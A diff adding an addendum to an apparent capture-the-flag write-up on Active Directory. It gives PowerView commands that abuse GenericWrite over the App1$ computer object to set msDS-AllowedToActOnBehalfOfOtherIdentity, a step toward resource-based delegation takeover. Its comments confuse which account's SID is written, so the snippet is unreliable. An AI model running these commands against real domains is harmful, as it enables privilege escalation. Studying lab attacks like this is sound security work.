@@ -224,6 +224,22 @@ We can manually confirm this by checking that `App1$` has the following configur
 
 | `msDS-AllowedToActOnBehalfOfOtherIdentity` | `D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3888316195-1058498269-834682652-1105)` |
 
+### Addendum 
+
+The configuration `msDS-AllowedToActOnBehalfOfOtherIdentity` was not present in the first version of the challenge and was probably introduced by an earlier solver. If that configuration was not present we need to create it. Since the `writeradmin` has `GenericWrite` over `App1$`, we could simply update the computer object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable `App2$` control over it. Taken from [here](https://burmat.gitbook.io/security/hacking/domain-exploitation).
+
+```powershell
+## we can write our delegation attribute to the DC with the following:
+$UserSid = Get-DomainUser 'App1$' -Properties objectsid | Select -Expand objectsid
+## we already did know the SID of 'App1$' and we could pass it directly (S-1-5-21-3888316195-1058498269-834682652-1105)
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($UserSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer app1.oposec.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+After that we could proceed to carry out the next steps.
+
 ## `App1$` takeover
 
 By searching for attacks that leverage this `AllowedToActOnBehalfOfOtherIdentity` functionality, we quickly find [*Kerberos Resource-based Constrained Delegation: Computer Object Take Over*](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution). While this is a several steps attack, we already have an account which has the `AllowedToAct` rights, thus we can focus on a subset of the steps of the attack:
